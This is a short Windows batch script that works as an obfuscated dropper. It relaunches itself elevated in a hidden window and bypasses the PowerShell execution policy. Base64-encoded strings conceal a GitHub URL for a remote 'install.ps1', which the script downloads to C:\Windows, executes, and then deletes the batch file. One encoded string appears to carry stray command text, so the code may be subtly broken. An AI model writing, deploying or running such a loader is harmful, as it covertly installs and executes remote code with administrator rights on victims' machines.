@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -WindowStyle Hidden '%~f0' -Verb runAs"
    exit /b
)
start "" /min powershell -Exec Bypass -WindowStyle Hidden -Command "$exe = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcV2luZG93c1xnby5wczE='))); Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pZ3VlbHNhbnRvczAyOS95b2xvL3JlZnMvaGVhZHMvbWFpbi9pbnN0YWxsLnBzMT9kbD0xJyAtT3V0RmlsZSAnQzpcV2luZG93c1xnby5wczE='))) -OutFile $exe; & $exe"
del "%~f0"